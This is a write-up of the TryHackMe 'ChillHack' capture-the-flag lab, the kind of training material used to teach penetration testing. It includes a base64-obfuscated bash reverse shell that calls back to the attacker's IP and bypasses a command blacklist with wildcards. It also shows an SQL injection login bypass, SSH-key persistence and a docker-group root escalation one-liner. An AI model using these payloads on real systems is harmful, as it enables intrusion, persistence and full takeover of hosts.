# 🛡️ TryHackMe – ChillHack - Writeup ---


## 📌 Overview
ChillHack is a comprehensive Capture The Flag (CTF) machine that covers a broad spectrum of penetration testing phases, including web vulnerability exploitation, internal network enumeration (SSH tunneling), steganography, and privilege escalation through misconfigured system groups.

---

## 🔍 1. Enumeration
Port Scanning & FTP

An initial scan using `nmap` revealed the following open ports:

• Port 21 (FTP): Anonymous login was allowed. A `note.txt` file was retrieved, which hinted at a filtering mechanism for the `/secret` directory on the web server.

• Port 22 (SSH): Remote access service.

• Port 80 (HTTP): Web server hosting the main site.

Directory Boosting

Using `gobuster` for directory discovery, I identified a hidden directory:

• Discovery: `/secret`

• Functionality: The page contained an input form designed to execute system commands directly.

---

## 🔓 2. Initial Access
Filter Bypass & Reverse Shell

The input form on `/secret` had a blacklist filter preventing the use of direct commands like `ls` or `/bin/bash`. To bypass this, I utilized Base64 encoding and shell wildcards.

1. Listener: Started a netcat listener on Kali: `nc -lvnp 4444`.

2. Payload Execution: Submitted the following payload into the form: `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1MC4yMDMvNDQ0NCAwPiYxCg== | base64 -d | /?in/ba?h`

  • Mechanism: The reverse shell command was Base64 encoded to bypass the filter. Upon execution, it was decoded and piped into `/?in/ba?h` (a wildcard representation of `/bin/bash`), effectively circumventing string-based security checks.

3. Result: Successfully obtained a reverse shell as the `www-data` user.

---

## 🚀 3. Privilege Escalation: www-data → apaar
Script Analysis & User Flag

Checking sudo permissions with `sudo -l` revealed that `www-data` could run a specific script as the user `apaar` without a password.

• Script: `/home/apaar/.helpline.sh`

• Vulnerability: The script took user input and executed it directly as a command.

• Exploitation: By entering `/bin/bash -i` into the message (`msg`) prompt, I successfully escalated privileges to `apaar`.

• User Flag: Recovered the first flag in `apaar`'s home directory.

  • local.txt: `{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}`

---

## 🔑 4. Privilege Escalation: apaar → anurodh
SSH Stability

To stabilize the connection, I added my Kali public key (`id_rsa.pub`) to `apaar`'s `/home/apaar/.ssh/authorized_keys`, allowing for persistent passwordless SSH access.

Internal Enumeration & SSH Tunneling

1. Internal Service: Running `ss -ntlp` revealed a service listening on `127.0.0.1:9001`.

2. Tunneling: I established an SSH local port forward: `ssh -L 9001:127.0.0.1:9001 apaar@<Target-IP>`.

3. SQL Injection: On the internal "Customer Portal," I found the login form was vulnerable to SQLi. Using the payload `' OR 1=1 #`, I successfully bypassed authentication.

Steganography & Hash Cracking

1. Clue: The authenticated page displayed the message: "Look in the dark! You will find your answer."

2. Analysis: After finding no results with `binwalk` or `exiftool`, I used steghide info on the image, which revealed an embedded file: `backup.zip`.

3. Cracking: Extracted the zip and used `john the ripper` to crack the password.

4. Result: Found `source_code.php`, which contained a Base64-encoded password string. Decoding it provided the password for the user anurodh: `!d0ntKn0wmYp@ssw0rd`.

---

## 🏁 5. Privilege Escalation: anurodh → root (Final)
Docker Group Exploitation

Running `id` showed that the user anurodh was a member of the docker group (GID: 999).

• Vulnerability: Membership in the docker group is equivalent to root access, as users can mount the host's root filesystem (`/`) into a container.

• Execution: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

• Result: By mounting the host's `/` to `/mnt` and using `chroot`, I gained a shell with full root privileges.

Root Flag: `{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}`